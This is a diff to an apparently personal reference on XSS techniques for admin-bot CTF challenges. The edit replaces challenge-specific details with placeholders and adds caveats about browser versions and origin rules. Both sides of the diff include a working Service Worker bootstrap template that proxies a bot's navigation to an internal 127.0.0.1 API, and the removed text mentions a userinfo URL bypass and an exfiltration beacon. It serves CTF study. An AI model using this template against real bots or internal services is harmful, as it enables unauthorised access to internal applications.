@@ -5,7 +5,7 @@ Sources:
 - https://github.com/terjanq/Tiny-XSS-Payloads (curated tiny-payload catalog with browser constraint tags)
 - https://github.com/c4llmeco4ch/1337UP-2023-Write-Ups (Intigriti 1337UP CTF — only warmup/misc writeups, less useful)
 
-Combined into a single tactical reference. The deskmesh-* references (from your HackNyx CTF session) complement this with empirical findings.
+Combined into a single tactical reference. Browser/version-sensitive claims below should be treated as empirical hypotheses and revalidated against the exact challenge browser.
 
 ---
 
@@ -204,7 +204,7 @@ When you see a bot-XSS challenge, walk this tree:
 
 ---
 
-## 6. Common pitfalls in modern Chrome (verified empirically from deskmesh CTF)
+## 6. Common pitfalls in modern Chrome (empirical; verify exact version)
 
 | Claim (from old writeups) | Reality (Chrome 147/149, June 2026) |
 |---------------------------|------------------------------------|
@@ -383,64 +383,68 @@ If the challenge uses `{RETURN_TRUSTED_TYPE: false}` only (no SAFE_FOR_XML, no C
 
 ---
 
-## 10. Service Worker Bootstrap Template (for XSS on auth-required same-origin)
+## 10. Service Worker Bootstrap: verify origin semantics before use
 
-When the bootstrap blocker is "need same-origin JS context on an internal app port that requires auth cookie", and you can host a JS file on a public endpoint, use a Service Worker. The SW runs in the page's origin context and can fetch cross-origin with custom headers (subject to CORS).
+A Service Worker can be useful in browser CTFs, but it does **not** magically grant the target origin. The worker executes under the origin that successfully registered it and its fetches remain subject to ordinary origin/CORS/credential rules.
 
-### When this works
-- Bot visits your URL (via `@-userinfo` bypass: `http://127.0.0.1:7000@HOST/xss`)
-- Your JS registers a SW on HOST origin
-- SW intercepts a navigation request, fetches the internal URL with the X-Desk-Action (or whatever) header
-- Browser renders the SW's response as a top-level navigation
-- If the response is text/html with XSS payload, it executes in the response's origin (e.g., http://127.0.0.1:7000) — same-origin JS to that origin
+Use this pattern only after proving:
 
-### When this FAILS (the gotchas)
-- **Mixed content**: page served over HTTP can't load HTTPS image (and vice versa). The exfil beacon must match the page's scheme.
-- **CORS on the response**: if the API endpoint doesn't return `Access-Control-Allow-Origin: *`, the fetch response is opaque. For top-level navigation, the body is still rendered as HTML by the browser, but you can't read it from JS.
-- **Secure context**: SW requires HTTPS (or localhost). Cloudflared quick tunnel returns 501 on HTTP, not a 30x redirect.
-- **Cookies**: SW runs in the page's origin. To use 127.0.0.1 cookies, the SW must be registered on a page from 127.0.0.1:7000 (bootstrap problem). If SW is on HOST origin, it can only send HOST cookies (or no cookies for cross-origin).
-- **No public HTTP endpoint**: cloudflared/ngrok free = HTTPS only. Trycloudflare returns 501 on HTTP. webhook.site accepts HTTP but doesn't serve custom HTML without API key.
+- the bot can reach and execute the registration page;
+- the registration origin is a secure context (HTTPS or permitted localhost case);
+- the worker scope covers the navigation you intend to intercept;
+- the internal fetch does not require target-origin cookies that the worker cannot send;
+- the response mode/content-type produces the browser behavior you need.
 
-### Template (when you have a working HTTP public endpoint)
+### Generic bootstrap shape
 
 `exploit.html`:
+
 ```html
-<!DOCTYPE html><html><body><script>
-const TICKET_ID = "PLACEHOLDER"; // server-injected
+<!doctype html><html><body><script>
+const ITEM_ID = 'PLACEHOLDER';
 navigator.serviceWorker.register('/sw.js', {scope: '/'}).then(async () => {
   await navigator.serviceWorker.ready;
   if (!navigator.serviceWorker.controller) {
-    await new Promise(r => navigator.serviceWorker.addEventListener('controllerchange', r, {once: true}));
-    location.reload(); return;
+    await new Promise(resolve =>
+      navigator.serviceWorker.addEventListener('controllerchange', resolve, {once: true})
+    );
   }
-  location.href = '/go?t=' + TICKET_ID;
+  location.href = '/go?id=' + encodeURIComponent(ITEM_ID);
 });
 </script></body></html>
 ```
 
 `sw.js`:
+
 ```javascript
-self.addEventListener('install', e => self.skipWaiting());
-self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
-self.addEventListener('fetch', e => {
-  const url = new URL(e.request.url);
-  if (url.pathname === '/go') {
-    const ticketId = url.searchParams.get('t');
-    e.respondWith(
-      fetch('http://127.0.0.1:7000/api/tickets/' + ticketId, {
-        method: 'GET',
-        headers: {'X-Desk-Action': 'view'},
-        mode: 'no-cors',  // OPAQUE response — body still rendered as HTML for top-level navigation
-        credentials: 'omit',  // can't use 127.0.0.1 cookies from HOST-origin SW
-        redirect: 'follow'
-      }).catch(err => new Response('Fetch failed: ' + err, {status: 500}))
-    );
-  }
+self.addEventListener('install', event => self.skipWaiting());
+self.addEventListener('activate', event => event.waitUntil(self.clients.claim()));
+
+self.addEventListener('fetch', event => {
+  const url = new URL(event.request.url);
+  if (url.pathname !== '/go') return;
+
+  const itemId = url.searchParams.get('id');
+  event.respondWith(
+    fetch('http://127.0.0.1:TARGET_PORT/api/items/' + encodeURIComponent(itemId), {
+      method: 'GET',
+      headers: {'X-Required-Action': 'view'},
+      mode: 'no-cors',
+      credentials: 'omit',
+      redirect: 'follow'
+    }).catch(error =>
+      new Response('Fetch failed: ' + error, {status: 500})
+    )
+  );
 });
 ```
 
-### If the response body isn't auto-rendered as HTML
+### Failure modes to test explicitly
 
-The above only works if the browser treats the SW's `respondWith` result as the navigation response (it does for top-level navigations). If the response Content-Type is honored differently, you'll get a download prompt or a blank page. Verify locally with the SAME Chrome version as the bot.
+- **Origin mismatch:** a worker registered on the attacker origin does not inherit target-origin cookies.
+- **Opaque response:** `no-cors` may permit a request but prevents JavaScript from reading the response body.
+- **Content type / navigation commit:** do not assume an intercepted response will execute as HTML; verify the committed document and headers.
+- **Mixed content / PNA / CSP:** network policy can kill the request even when registration succeeded.
+- **Service-worker lifecycle:** install/activate/control timing can race with navigation.
 
-If the SW response has `X-Content-Type-Options: nosniff` or the API doesn't set the content-type, the browser might guess wrong. The `/api/tickets/<id>` endpoint in deskmesh returns text/html by default (Flask) — good. But other endpoints might not.
+Treat the Service Worker as a browser state-machine primitive, not as a universal same-origin bypass. Validate it in the exact browser version with server-side request logs.
